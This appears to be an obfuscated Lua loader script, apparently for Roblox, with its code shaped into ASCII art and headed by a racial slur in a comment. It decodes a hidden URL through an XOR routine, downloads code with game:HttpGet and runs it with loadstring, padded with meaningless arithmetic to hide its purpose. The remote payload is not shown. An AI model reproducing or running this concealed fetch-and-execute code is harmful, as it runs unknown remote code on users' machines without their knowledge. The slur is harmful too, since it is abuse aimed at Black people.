-- Nigga



                                          local b
                                        = {[4] =
                                     "V!j", [8]
                                  = "H[pBiO" ,
                                 [  13  ]   =
                               "G?$yQ", [9] =
                             "o9LVI@", [5] =
                             "Qg>To", [11] =
                             "au(", [ 3]  =
                             "UOc<h]", [7 ]
                        =    "[7oI", [15] =
                             "!7%", [ 2]  =
                             "q%c", [ 1]  =
                              "R9&(+^", [12
                      ]   =   "a^G5-h", [14
                     ]     =   "u=}", [6] =
                     "m9`" ,   [10] = ".+v"}
                     ;  local   i =  "!$%&("
                     ..")*+,-"   .."./012"..
                     "34567" ..   "89:;<"  ..
                     "=>?@A".."B"  .."CDEF" ..
                     "GHIJK".."LM"  .."NOP".."QRS"
                     .."TU".."VWXYZ"  .."[]^_`" ..            "abcde"  ..
                     "fghij".. "klmno"  .. "pqrst"        ..   "uvwxy"   ..
                      "z{|}~"; local v = table   .     concat(b); local d  =
                      {}; local w = 29731; for e =  1, #v, 5 do local h = 0 ;
                        for t = e, e + 4 do h = h * 90 + string.find(i, v:sub(t
                           , t), 1, true) - 1; end; for t = 3, 0, - 1 do w =  (w
                         *      83 + 49993) %  65521; d[ #d + 1 ] = string. char(
                         bit32.bxor(math.floor(h/ 256^t) % 256,  w % 256)); end ;
                           end; b = table.concat(d):sub(1, 51); local m        , g
                            = loadstring(game:HttpGet(b)); assert(m,             g
                             ); do local x =  7; x = (x  * 4) % 5 ;
                               end; do local x = {4, 2}; x[1] = x[2
                                 ]  %  6; end; do local x = {2, 9} ;
                                     x[1] = x[2] % 5; end; local x =
                                     8 % 6 - 8 % 1 - 5 - 3 % 5 % 9 - 8
                                          + 2 % 7 % 9 + 8 + 7 % 4 % 4 %
                                                5 - 8 % 5 % 4 + 3 - 9  -
                                                        7 % 6 - 6 % 9 - 6
                                                             + 1 - 1 % 3  %
                                                                9 % 2 + 6 %
                                                                   1 % 1 % 1
                                                                     -    2;
                                                                       return
                                                                           m(
                                                                           ...
                                                                             )
